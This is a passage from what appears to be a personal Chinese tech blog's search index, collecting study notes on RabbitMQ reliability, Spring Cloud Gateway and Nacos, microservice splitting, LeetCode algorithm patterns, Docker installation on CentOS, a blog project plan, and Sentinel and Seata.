Fanout 广播模式，将接收到的消息路由到每一个与其绑定的 queue\nDirect 定向路由，根据规则路由到指定的 queue\n设置 BindingKey 和 RoutingKey Topic 基于 RoutingKey，但其通常是多个单词的组合，且以.分割，可以使用通配符# *\n声明队列交换机 用代码自动完成队列、交换机的创建\n基于Bean声明 在消费者端声明：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 @Configuration public class FanoutConfig { // 声明FanoutExchange交换机 @Bean public FanoutExchange fanoutExchange(){ return new FanoutExchange(\u0026#34;hmall.fanout\u0026#34;); } // 声明第1个队列 @Bean public Queue fanoutQueue1(){ return new Queue(\u0026#34;fanout.queue1\u0026#34;); } // 绑定队列和交换机 @Bean public Binding bindingQueue1(Queue fanoutQueue1, FanoutExchange fanoutExchange){ return BindingBuilder.bind(fanoutQueue1).to(fanoutExchange); } // ... 略，以相同方式声明第2个队列，并完成绑定 } 基于注解声明 优化 Bean 声明中绑定 Key 的冗余代码。\n1 2 3 4 5 6 7 8 @RabbitListener(bindings = @QueueBinding( value = @Queue(name = \u0026#34;direct.queue1\u0026#34;), exchange = @Exchange(name = \u0026#34;itcast.direct\u0026#34;, type = ExchangeTypes.DIRECT), key = {\u0026#34;red\u0026#34;, \u0026#34;blue\u0026#34;} )) public void listenDirectQueue1(String msg){ System.out.println(\u0026#34;消费者1接收到Direct消息: [\u0026#34;+msg+\u0026#34;] \u0026#34;); } 消息转换器 负责将对象转换为字节格式传输\n问题：\n默认序列化由安全风险 信息体积变大 可读性差 解决：\n用 Jackson 序列转换器\n注意收发一致\n进阶 改进消息可靠性问题\n发送者可靠性 重连 由于网络波动，可能出现发送者连接 MQ 失败。\n配置中开启重连机制即可\n注意性能损耗 使用合理的重连机制 确认 MQ 接收到消息后，返回 ACK 给发送者。（对性能影响较大）\n不同的返回情况、强度 其他情况返回 NACK，告知投递失败 使用：\n先开启配置 public confirm type\n配置类\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 @Slf4j @AllArgsConstructor @Configuration public class MqConfig { private final RabbitTemplate rabbitTemplate; @PostConstruct //只在启动时初始化依次 public void init(){ rabbitTemplate.setReturnsCallback(new RabbitTemplate.ReturnsCallback() { @Override public void returnedMessage(ReturnedMessage returned) { log.error(\u0026#34;触发return callback,\u0026#34;); log.debug(\u0026#34;exchange: {}\u0026#34;, returned.getExchange()); log.debug(\u0026#34;routingKey: {}\u0026#34;, returned.getRoutingKey()); log.debug(\u0026#34;message: {}\u0026#34;, returned.getMessage()); log.debug(\u0026#34;replyCode: {}\u0026#34;, returned.getReplyCode()); log.debug(\u0026#34;replyText: {}\u0026#34;, returned.getReplyText()); } }); } } 发送方： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 @Test void testPublisherConfirm() throws InterruptedException { // 1.创建CorrelationData CorrelationData cd = new CorrelationData(); // 2.给Future添加ConfirmCallback cd.getFuture().addCallback(new ListenableFutureCallback\u0026lt;CorrelationData.Confirm\u0026gt;() { @Override public void onFailure(Throwable ex) { // 2.1.Future发生异常时的处理逻辑，基本不会触发 log.error(\u0026#34;handle message ack fail\u0026#34;, ex); } @Override public void onSuccess(CorrelationData.Confirm result) { // 2.2.Future接收到回执的处理逻辑，参数中的result就是回执内容 if(result.isAck()){ // result.isAck()是boolean类型，true代表ack回执，false代表nack回执 log.debug(\u0026#34;发送消息成功，收到 ack!\u0026#34;); }else{ // result.getReason()是String类型，返回nack时的异常描述 log.error(\u0026#34;发送消息失败，收到 nack，reason：{}\u0026#34;, result.getReason()); } } }); // 3.发送消息 rabbitTemplate.convertAndSend(\u0026#34;hmall.direct\u0026#34;, \u0026#34;red1\u0026#34;, \u0026#34;hello\u0026#34;, cd); } 若发送失败，则尝试重发\nMQ可靠性 问题：\n数据丢失\n内存空间有限，可能导致消息阻塞、堆积\n数据持久化 交换机、队列、消息\n消息：内存到上限后，才写出到磁盘，阻塞 一直写出到磁盘 Lazy Queue 惰性队列\n接到消息不再写到内存，直接存入磁盘 消费消息时，从磁盘中读取并加载到内存 消费者可靠性 确认 消费者处理消息结束后，向 MQ 发送回执，告知消息处理状态\nack：成功处理 配置`acknowledge-mode none 接到后直接返回。不安全 manual 手动编写返回逻辑 auto nack：处理失败，需要重发 reject：处理失败并拒绝，MQ 从队列中删除该消息 失败重试 问题：消费者反复调用 MQ 导致性能损耗\n解决：消费者出现异常时利用本地调试机制，无需调用 queue\n重试耗尽后的策略\n直接 reject（默认） 返回 nack，重新入队 将失败消息投递到指定的交换机 业务幂等 程序开发时，同一个业务执行一次和多次对业务状态的影响是一致的。用于确保消息不被多次执行。\n解决方案：\n给每个消息设置唯一 id ，配置SetMessageId，然后将 id 写入数据库\n业务判断：基于业务本身\n保证服务间一致性 延迟消息 实现一致性的兜底方案。\n发送者发送消息时指定时间，消费者在指定时间后才收到消息\n如支付超时取消 死信交换机 死信：\nrequeue = false 消息无人消费、过期 \u0026ndash;\u0026gt; 用于实现延迟消息 消息堆积满了，最早的消息成为死信 死信交换机：\n接收死信 消息延迟插件 RabbitMQ的插件，docker部署\n计时需要占用 CPU，产生资源消耗 尽可能延时缩短 ","date":"2025-10-02T00:00:00Z","permalink":"https://calendar0917.github.io/posts/mq/","title":"MQ"},{"content":"网关 介绍 网络的关口，负责请求的路由、转发、身份检验。分为阻塞式、响应式。微服务将服务注册到注册中心，网关进行服务拉取返回给前端。\n使用 创建新模块 引入网关依赖 编写启动类 配置路由 1 2 3 4 5 6 7 8 9 10 11 12 spring: cloud: gateway: routes: - id: item # 路由规则id，自定义，唯一 uri: lb://item-service # 路由目标微服务，lb代表负载均衡 predicates: # 路由断言，判断请求是否符合规则，符合则路由到目标 - Path=/items/** # 以请求路径做判断，以/items开头则符合 - id: xx uri: lb://xx-service predicates: - Path=/xx/** 另有各种路由种类、路由过滤器。\n登录校验 需要在网关转发之前进行校验，即添加过滤器。\n网关底层流程：\nHandlerMapping 路由映射器 WebHandler 请求处理器，即过滤器处理器 PRE（在这里实现） + POST 阶段 Q: 网关如何将用户信息传递给微服务？\nHttp 传送 \u0026ndash;\u0026gt; 用请求头 Q: 微服务之间如何传递用户信息？\n自定义过滤器 GatewayFilter：指定路由生效 GlobalFilter：全局过滤器，作用于所有路由 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 @Component public class MyGlobalFilter implements GlobalFilter, Ordered { @Override public Mono\u0026lt;Void\u0026gt; filter(ServerWebExchange exchange, GatewayFilterChain chain) { // 1.获取请求 ServerHttpRequest request = exchange.getRequest(); // 2.过滤器业务处理 System.out.println(\u0026#34;GlobalFilter pre阶段 执行了。\u0026#34;); // 3.放行 return chain.filter(exchange); } @Override public int getOrder() { // 过滤器执行顺序，值越小，优先级越高 return 0; } } 网关拦截逻辑： 获取 request\n根据 URL 判断是否需要拦截\n获取 Token，解析校验\n网关传递服务 用 ServerWebExchange 类下的 API 来给请求头添加鉴权信息，再发送给后续服务。\n将登录检验封装为工具模块（配置类），统一扫描调用。\n配置类的配置：@ConditionalOnClass(DispatcherServlet.class) 只拦截到后端 SpringMVC 的请求（否则其他模块扫描不到），绕过网关。\n微服务间传递信息 利用 OpenFeign 的 RequestTemplate 类更改请求头传递，保存请求头。\n配置管理中心 问题：\n微服务重复配置过多，维护成本高 更改配置不方便，需要重启服务、网关 解决：\n通过配置管理实现热更新、配置共享 配置管理 NACOS 可视化编辑共享配置 包含：\n数据库\n日志\nSwagger\n……\n微服务拉取共享配置 流程：\n启动，加载 bootstrap 引导类 拉取 Nacos 配置 初始化 ApplicationContext上下文 加载 application.yml ，拉取共享配置，合并配置 配置热更新 前提条件\nnacos 中要有于微服务名有关的配置文件 微服务中要以特定方式读取需要热更新的配置属性 动态路由 要求：\n监听 Nacos 配置变更信息 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 private final NacosConfigManager nacosConfigManager; public void initRouteConfigListener() throws NacosException { // 1.注册监听器并首次拉取配置 String configInfo = nacosConfigManager.getConfigService() .getConfigAndSignListener(dataId, group, 5000, new Listener() { @Override public Executor getExecutor() { return null; } @Override public void receiveConfigInfo(String configInfo) { // TODO 监听到配置变更，更新一次配置 } }); // TODO 2.首次启动时，更新一次配置 } 再定义 UpdateConfigInfo(),删除旧的路由、重新读取新路由 ","date":"2025-10-01T00:00:00Z","permalink":"https://calendar0917.github.io/posts/%E7%BD%91%E5%85%B3%E5%8F%8A%E9%85%8D%E7%BD%AE%E4%B8%AD%E5%BF%83/","title":"网关及配置中心"},{"content":"为什么需要拆分？ 单体架构不适合于用户量大、开发人员多的项目 访问资源难以分配，无法分解并发压力 \u0026ndash;\u0026gt; 把单体架构拆分为多个独立项目\n颗粒度小，团队自治，服务自治，数据隔离\n服务拆分 前置知识 首先熟悉项目、模块，看流程。\n拆分时机\n创业型项目先采用单体结构，随规模扩增\n拆分原则\n高内聚（关联度、完整度高），低耦合（减少对其他服务依赖）\n纵向：按业务模块\n横向：抽取公共服务，提高复用性\n拆分类型\n独立 project：适用于大型项目\nMaven 聚合，分开打包：较小型项目\n注册中心\n整合服务调用、服务提供者\n提供负载均衡，心跳续约、推送变更（防失效）\nNacos\n需要提供数据库，配置服务注册\n服务发现 -\u0026gt; 挑选示例（负载均衡） -\u0026gt; 调用\nOpenFeign\n声明式http客户端，简化http请求书写\n使用步骤：导入 client 模块 -\u0026gt; 打开开关 -\u0026gt; 写接口\n接口的作用是转发 http 请求，作为各个服务间请求数据的中介\n连接池：底层请求用的是 Client，效率较低，用连接池优化\n最佳实践：1. 将查询接口放到服务提供方 2 . 封装为统一的api模块（耦合度较高）\n日志记录：定义类、定义日志级别，声明到注解\n拆分步骤 先按模块分析，将实体类区分开 选择拆分类型，建立模块或项目，改依赖 导入并修改启动类、配置类、各种实体类，根据报错再修改 导入service、impl、controller、mapper 重建数据库、配置启动项进行测试 注意\n若 service 中还需要注入其他模块的 service，就要配置注册中心。接入 feign 的 api 接口来调用指定服务。在拆分的同时不断完善 feign 的接口（从目标服务的 controller 中抽取）。\n","date":"2025-10-01T00:00:00Z","permalink":"https://calendar0917.github.io/posts/%E5%BE%AE%E6%9C%8D%E5%8A%A1%E6%8B%86%E5%88%86/","title":"微服务拆分"},{"content":"哈希 适用场景：\ncollections.defaultdict(type) 字典类型，自动添加某类型元素。思考哈希值如何计算、如何存储。 涉及到查重、判断是否存在相似元素时，可以使用。 例题 字母异位词分组 1 2 3 4 5 1. collections.defaultdict(list) 满足返回的为各个字符集;通过 mp[key].append(st) 来给字典加入值。 2. \u0026#34;\u0026#34;.join(sorted(s)) 来排序、求重 3. return list(mp.values()) 直接返回值的列表 最长连续序列 1 2 3 1. 利用集合去重、提高查找速度 2. 分析连续序列所满足的条件、限制的条件：若n-1在序列中，则无需遍历n，利用包含关系来简化算法 双指针 适用场景：\n多变量问题，变量间存在某种关系 首尾比较、字符移动 同向、相向遍历问题 通法：\n初始化左右指针，并考虑其作用、意义 写循环，考虑边界条件、指针变化规律，注意规范 例题 移动0 1 2 3 1. 由于要将0移到末端，所以右指针需要指向非零数，左指针指向0，两数交换即可 2. 边界条件：右指针到末尾即停止，因为已经没有非零数需要向前移动 盛最多水的容器 1 2 3 4 5 6 1. 暴力思路：直接两层for循环从左向右遍历 2. 思考：有必要依次循环吗？什么情况下会出现最大值？如何趋向最大值？ 3. 优化：计算面积的公式是：(right - left)*min(height[left],height[right]) 那么不妨从 right - left 最大时开始遍历，这时想到双指针。那么往里收缩的条件就变成比较height的大小。如果height更大就直接保留，舍去了很多不必要的情况。 三数之和 1 2 3 4 5 1. 难点在于去重，各个值的组合不能重复 2. 思考：\u0026#34;不能重复\u0026#34;这一要求能不能转化？ 3. 优化：不妨将数组重新排序，从而让三个数也排序地输出，免去了去重的麻烦。更进一步，a+b+c=0是等式关系，而a确定后，b是递增的，c又是由a、b决定的，故可以将b、c用双指针遍历，一增一减，完全符合要求。 滑动窗口 适用情景：\n连续子数组、子序列 在一个范围内进行条件统计 具有单调性，随窗口移动时不必全部更新 要点在于，将问题放到窗口中讨论，控制窗口来控制遍历所有可能情况 模板：\n右入（直到装满窗口） - 判断 - 更新 - 左出\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 ans = vowel = 0 for i, c in enumerate(s): # 枚举窗口右端点 i # 1. 右端点进入窗口 if c in \u0026#34;aeiou\u0026#34;: vowel += 1 left = i - k + 1 # 窗口左端点 if left \u0026lt; 0: # 窗口大小不足 k，尚未形成第一个窗口 continue # 2. 更新答案 ans = max(ans, vowel) if ans == k: # 答案已经等于理论最大值 break # 无需再循环 # 3. 左端点离开窗口，为下一个循环做准备 if s[left] in \u0026#34;aeiou\u0026#34;: vowel -= 1 return ans 定长 无重复字符的最长字串 1 2 3 4 5 6 7 1. 先模拟，右指针移动到发现重复字符时为边界 2. 边界处理：发现移动左指针时，无需将右指针移动回来（单调性），移动左指针即可 3. 注意：边界要分清楚！！right - left 的相对关系不能错 4. Counter(str) 方法，统计各个字符出现的次数 几乎唯一子数组的最大和 如果 nums 的一个子数组有至少 m 个互不相同的元素，我们称它是 几乎唯一 子数组。\n1 2 3 4 5 6 7 1. 区间求和，考虑用滑动窗口 2. 有两个变量 m,k 分别维护即可。用一个字典来标记是否有重复！ 3. 注意：当 defaultdict(int) 为空时，需要将元素删去！否则统计长度时会出错。 if cnt[out] == 0: del cnt[out] 不定长 + 越长越合法 每个字符最多出现两次 给你一个字符串 s ，请找出满足每个字符最多出现两次的最长子字符串，并返回该子字符串的 最大 长度。\n1 2 3 1. 区间判断，仍然是滑动窗口，不同之处在于变成了不定长滑窗 2. 不定长的判断逻辑修改一下即可 使数组平衡的最少移出数目 给你一个整数数组 nums 和一个整数 k。\n如果一个数组的 最大 元素的值 至多 是其 最小 元素的 k 倍，则该数组被称为是 平衡 的。\n你可以从 nums 中移除 任意 数量的元素，但不能使其变为 空 数组。\n返回为了使剩余数组平衡，需要移除的元素的 最小 数量。\n1 1. 能看出是滑动窗口吗？问题转化为：求一个窗口，使得其最小元素最小值*k \u0026gt;= 最大值！ 不定长 + 越短越合法 最短美丽字串 给二进制字符串s和正整数k，找到满足以下条件的子字符串：\n子字符串中1的个数恰好是k（即美丽子字符串）； 该子字符串是所有美丽子字符串中最短的； 若有多个最短的，选字典序最小的；若没有美丽子字符串，返回空字符串。 1 2 3 4 5 1. 如何保证最短？ --\u0026gt; 最前端如果有 0，需要继续向后 2. 当达到筛选条件后，需要进一步收缩边界！ 3. 字符串字典序直接比较即可 求子数组个数 + 越短越合法 元素乘积小于 k 的子数组数目 给你一个整数数组 nums 和一个整数 k ，请你返回子数组内所有元素的乘积严格小于 k 的连续子数组的数目。\n1 2 3 1. 要求连续子数组，发现缩短以后一样符合条件，所以是滑窗的变式 2. 小于当前窗口的都符合，所以要 res += right - left + 1 不间断子数组数目 给你一个下标从 0 开始的整数数组 nums 。nums 的一个子数组如果满足以下条件，那么它是 不间断 的：\ni，i + 1 ，\u0026hellip;，j 表示子数组中的下标。对于所有满足 i \u0026lt;= i1, i2 \u0026lt;= j 的下标对，都有 0 \u0026lt;= |nums[i1] - nums[i2]| \u0026lt;= 2 。 请你返回 不间断 子数组的总数目。\n子数组是一个数组中一段连续 非空 的元素序列。\n1 2 3 1. 用哈希表维护的判断条件！ 2. 还是滑窗的思路，依次控制窗口枚举 求子数组个数 + 越长越合法 包含所有三种字符的子字符串数目 给你一个字符串 s ，它只包含三种字符 a, b 和 c 。\n请你返回 a，b 和 c 都 至少 出现过一次的子字符串数目。\n1 2 3 4 5 1. 先找至少出现过一次的情况，想到滑动窗口 2. “至少”意味着只能找最短，所以在更新时要将更长的字符串加上，即 res += left 3. 注意：不能写 if len(cnt) \u0026lt; 3: continue 的判断，边界条件要考虑清楚！ 恰好型滑窗 要计算有多少个元素和恰好等于 k 的子数组，可以把问题变成：\n计算有多少个元素和 ≥k 的子数组。 计算有多少个元素和 \u0026gt;k，也就是 ≥k+1 的子数组。 因为滑动窗口比较难解决“等于”问题，故尝试转化成不等于问题，即越\u0026hellip;越合法\n答案就是元素和 ≥k 的子数组个数，减去元素和 ≥k+1 的子数组个数。\n也可以把问题变成 ≤k 减去 ≤k−1，即两个「至多」。可根据题目选择合适的变形方式。 和相同的二元子数组 给你一个二元数组 nums ，和一个整数 goal ，请你统计并返回有多少个和为 goal 的 非空 子数组。\n子数组 是数组的一段连续部分。\n1 2 3 1. 求区间和，可以用前缀和，但是这里考虑滑窗 2. 转为求 res1 - res2，需要用两个 left1，2、sum1，2 来分别求边界 前缀和 适用情景：\n连续子数组求和问题，数组不单调时，考虑用前缀和 任意子数组都是一个前缀去掉前缀后的结果。所以任意子数组的和，都可以表示为两个前缀和的差。 定义 s[0] = 0 ，提高适用性 初始化模板：\n1 2 3 s = [0] * (len(nums) + 1) for i, x in enumerate(nums): s[i + 1] = s[i] + x 例题 和为 K 的子数组 1 2 3 4 5 6 7 1. 连续数组求和，考虑前缀和 2. 继续分析，发现要求 s[i] + s[j] == k，暴力写法要 O(n^2)，考虑转换 3. 想到哈希表，空间换时间，遍历一遍后存储到表中，可以直接查询 s[j] - k 4. 注意：哈希表的遍历顺序和数组顺序要对应！先寻找，再加入哈希表，不能一次性往里添加 最大子数组和 1 2 3 4 5 1. 考虑前缀和 2. 发现边缘条件：需要考虑负数！前缀和求的是区间加法，所以要用当前前缀减去前面的最小前缀（需要维护） 3. 还可以用动态规划 二分 适用场景：\n有序数组找指定大小的数 思路：\n先确定区间（循环不变量），根据区间来初始化左右指针\n明确：左右指针以外是已经确定了大小关系的，接下来要更新的是左右指针以内的数\n转化\n基本做法只能做 \u0026gt;= x\n遇见 \u0026gt;x，转成 \u0026gt;= x+1，\u0026lt;x 转成 \u0026lt;= x-1 等等\n示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 def binary_search(nums, target): left = 0 right = len(nums) - 1 # 闭区间初始化 while left \u0026lt;= right: # 区间非空时循环 mid = (left + right) // 2 # 避免溢出可用 left + (right - left) // 2 if nums[mid] == target: return mid # 找到目标，返回索引 elif nums[mid] \u0026gt; target: right = mid - 1 # 目标在左半区间，收缩右边界 else: left = mid + 1 # 目标在右半区间，收缩左边界 return -1 # 区间为空，未找到 def find_first_ge(nums, target): left = 0 right = len(nums) - 1 res = len(nums) # 默认值（若所有元素都小于target，返回数组长度） while left \u0026lt;= right: mid = (left + right) // 2 if nums[mid] \u0026gt;= target: res = mid # 可能是候选答案，继续向左找更小的符合条件的位置 right = mid - 1 else: left = mid + 1 # 不符合，向右找 return res ","date":"2025-09-30T00:00:00Z","image":"https://raw.githubusercontent.com/calendar0917/images/master/20251017094519413.png","permalink":"https://calendar0917.github.io/posts/leetcode/","title":"LeetCode Hot100"},{"content":"查看是否已安装 1 docker --version 若已安装：\n1 2 3 4 5 6 7 8 9 10 11 yum remove docker \\ docker-client \\ docker-client-latest \\ docker-common \\ docker-latest \\ docker-latest-logrotate \\ docker-logrotate \\ docker-selinux \\ docker-engine-selinux \\ docker-engine \\ docker-ce 安装依赖工具 yum 1 sudo yum install -y yum-utils device-mapper-persistent-data lvm2 错误：yum-config-manager：找不到命令\nyum -y install yum-utils\n错误：更新 yum 报错\nsudo tee /etc/yum.repos.d/CentOS-Base.repo \u0026laquo;-\u0026lsquo;EOF\u0026rsquo; [base] name=CentOS-$releasever - Base baseurl=http://mirrors.aliyun.com/centos/$releasever/os/$basearch/ gpgcheck=1 gpgkey=http://mirrors.aliyun.com/centos/RPM-GPG-KEY-CentOS-7\n[updates] name=CentOS-$releasever - Updates baseurl=http://mirrors.aliyun.com/centos/$releasever/updates/$basearch/ gpgcheck=1 gpgkey=http://mirrors.aliyun.com/centos/RPM-GPG-KEY-CentOS-7\n[extras] name=CentOS-$releasever - Extras baseurl=http://mirrors.aliyun.com/centos/$releasever/extras/$basearch/ gpgcheck=1 gpgkey=http://mirrors.aliyun.com/centos/RPM-GPG-KEY-CentOS-7\nEOF\n安装docker 添加 docker 官方仓库\n1 2 3 4 sudo yum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo # 阿里云： sudo yum-config-manager --add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo 安装\n1 sudo yum install -y docker-ce docker-ce-cli containerd.io 启动、设置开机自启\n1 2 sudo systemctl start docker sudo systemctl enable docker docker 拉取镜像源配置 添加多个镜像源\n1 2 3 4 5 6 7 8 9 10 11 12 sudo tee /etc/docker/daemon.json \u0026lt;\u0026lt;-\u0026#39;EOF\u0026#39; { \u0026#34;registry-mirrors\u0026#34;: [ \u0026#34;https://alzgoonw.mirror.aliyuncs.com\u0026#34;, \u0026#34;https://docker.m.daocloud.io\u0026#34;, \u0026#34;https://dockerhub.icu\u0026#34;, \u0026#34;https://docker.anyhub.us.kg\u0026#34;, \u0026#34;https://docker.1panel.live\u0026#34; ] } EOF 重新加载并重启\n1 2 sudo systemctl daemon-reload sudo systemctl restart docker 测试\n1 docker pull hello-world ","date":"2025-09-29T00:00:00Z","permalink":"https://calendar0917.github.io/posts/%E9%85%8D%E7%BD%AEdocker/","title":"配置docker"},{"content":"准备工作 技术栈 后端 核心框架：Spring Boot 2.x（简化配置，快速开发） 持久层：MyBatis-Plus（在 MyBatis 基础上增强，提供 CRUD 简化） 数据库：MySQL 8.0（存储博客核心数据） 缓存：Redis（缓存热门文章、用户会话等） 安全框架：Spring Security（处理认证授权） API 文档：Swagger/OpenAPI（自动生成接口文档） 部署：Docker（容器化部署，简化环境配置） 前端 基础框架：Vue 3 + Vite（轻量高效的前端框架） UI 组件库：Element Plus（与 Vue 3 配套的组件库） 路由：Vue Router（前端路由管理） 状态管理：Pinia（Vue 3 推荐的状态管理库） HTTP 客户端：Axios（与后端 API 交互） Markdown 编辑器：mavon-editor（博客编辑功能） 功能模块设计 核心功能 用户模块：注册、登录、个人信息管理 文章模块：发布、编辑、删除、查询、分类、标签 评论模块：文章评论、回复功能 分类与标签：文章归类和标签管理 首页展示：文章列表、热门推荐、最新发布 扩展功能（可选） 文章搜索（Elasticsearch） 阅读统计与排行榜 点赞与收藏功能 后台管理系统 图片上传（阿里云 OSS 等） 开发步骤 阶段 1：项目初始化与基础搭建 创建 Spring Boot 后端项目，配置 MySQL 和 Redis 连接 设计数据库表结构（用户表、文章表、分类表、标签表、评论表等） 创建 Vue 前端项目，配置基础路由和组件 阶段 2：核心功能开发 实现用户认证授权功能 开发文章 CRUD 接口及对应的前端页面 实现分类和标签管理功能 开发评论功能 阶段 3：优化与扩展 添加 Redis 缓存热门数据 实现分页和排序功能 开发后台管理界面 添加搜索功能 阶段 4：部署上线 项目打包与测试 配置 Docker 部署环境 上线到云服务器（如阿里云、腾讯云学生机） 数据库设计 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 # 用户表 users(id, username, password, email, avatar, create_time, update_time) # 文章表 articles(id, title, content, summary, cover_image, user_id, view_count, like_count, comment_count, status, create_time, update_time) # 分类表 categories(id, name, description, user_id, create_time) # 标签表 tags(id, name, user_id, create_time) # 文章-标签关联表 article_tags(article_id, tag_id) # 评论表 comments(id, content, article_id, user_id, parent_id, create_time) 前端开发要点 1 2 3 4 5 6 7 8 9 10 11 12 13 src/ ├── assets/ # 静态资源 ├── components/ # 通用组件 ├── router/ # 路由配置 ├── store/ # 状态管理 ├── services/ # API服务 ├── views/ # 页面组件 │ ├── home/ # 首页 │ ├── article/ # 文章相关 │ ├── user/ # 用户相关 │ └── admin/ # 管理后台 ├── utils/ # 工具函数 └── App.vue # 根组件 核心页面： 首页（文章列表展示） 文章详情页 文章编辑页 登录 / 注册页 个人中心 管理后台 开发 Day1 后端基础架构 数据库 如上先设计了 User 表\n配置 Swagger 引依赖：\n1 2 3 4 5 6 7 8 9 10 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;io.springfox\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;springfox-boot-starter\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.0.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;io.springfox\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;springfox-swagger-ui\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.0.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 改配置类：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 @Configuration public class SwaggerConfig { @Bean public OpenAPI customOpenAPI() { return new OpenAPI() .info(new Info() .title(\u0026#34;你的项目名称 API文档\u0026#34;) .version(\u0026#34;1.0\u0026#34;) .description(\u0026#34;你的项目API描述\u0026#34;) .license(new License() .name(\u0026#34;许可证名称\u0026#34;) .url(\u0026#34;许可证链接\u0026#34;))); } } ","date":"2025-09-08T00:00:00Z","permalink":"https://calendar0917.github.io/posts/%E5%8D%9A%E5%AE%A2%E5%BC%80%E5%8F%91/","title":"博客开发记录"},{"content":"微服务保护 问题：\n雪崩问题：某个服务故障，导致整个链路失效 微服务相互调用 没有做好异常处理 所有服务级联失败 解决思路：\n尽量避免服务故障、阻塞\n做好异常的后备方案\n方案：\n请求限流 线程隔离：控制业务可用线程数量 服务熔断：将异常比例过高的接口断开，直接走 fallback 失败处理：定义 fallback 处理逻辑 Sentinel 整合到微服务中，配置控制台\n簇点链路：默认情况下，Sentinel 拦截的只是 Controller 的请求路径，故需要配置其拦截请求方法。\n请求限流 设置 QPS，每秒最多请求线程数\nJmeter\n请求模拟工具，用于测试压力\n线程隔离 服务 B 出现阻塞或故障时，调用服务 B 的服务 A 的资源也可能因此被耗尽，故必须限制服务 A 中调用服务B的线程数。保护服务 A 中其他接口。\nFallback 将 FeignClient 添加到服务，若超限，则调用其中的 FallFactory 的接口。\n服务熔断 解决雪崩问题的重要手段。有断路器统计服务调用的异常比例、慢请求比例，若超出阈值则熔断改服务。\n分布式事务 分布式系统中，一个业务需要多个服务共同完成，则这多个服务需要同时成功或失败。\n解决思路：\n各个子事务之间能感知到彼此的状态 Seata Seata架构 TC：事务协调者，协调全局事务提交或回滚\nTM：事务管理器，定义全局事务的范围，开始提交或回滚（入口）\nRM：资源管理器，与 TC 交谈以注册事务状态\n部署 TC 服务 seata 用 docker 部署，然后注册到 Nacos 上\n微服务集成 Seata 在 application.yml 中添加配置，让微服务找到 TC 地址\n抽取共享配置到 nacos、划分事务组\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 seata: registry: # TC服务注册中心的配置，微服务根据这些信息去注册中心获取tc服务地址 type: nacos # 注册中心类型 nacos nacos: server-addr: 192.168.150.101:8848 # nacos地址 namespace: \u0026#34;\u0026#34; # namespace，默认为空 group: DEFAULT_GROUP # 分组，默认是DEFAULT_GROUP application: seata-server # seata服务名称 username: nacos password: nacos tx-service-group: hmall # 事务组名称 service: vgroup-mapping: # 事务组与tc集群的映射关系 hmall: \u0026#34;default\u0026#34; XA 模式 步骤：\nRM 注册分支事务到 TC RM 执行 sql 但不提交 RM 报告执行状态到 TC TC 检查各分支执行状态，RM 等待 TC 指令 问题：\n需要锁定数据库资源，需要等待，性能较差 AT 模式 弥补 XA 模式中资源锁定周期过长的缺陷\n步骤：\n注册分支事务 记录数据快照 执行 sql 并提交 报告事务状态 删除快照 / 根据快照恢复数据 问题：\n短暂的数据不一致 使用：\n对每个服务创建一个 undo_log 表 ","date":"2025-09-08T00:00:00Z","permalink":"https://calendar0917.github.io/posts/%E5%BE%AE%E6%9C%8D%E5%8A%A1%E4%BF%9D%E6%8A%A4%E5%92%8C%E5%88%86%E5%B8%83%E5%BC%8F%E4%BA%8B%E5%8A%A1/","title":"微服务保护及分布式事务"}]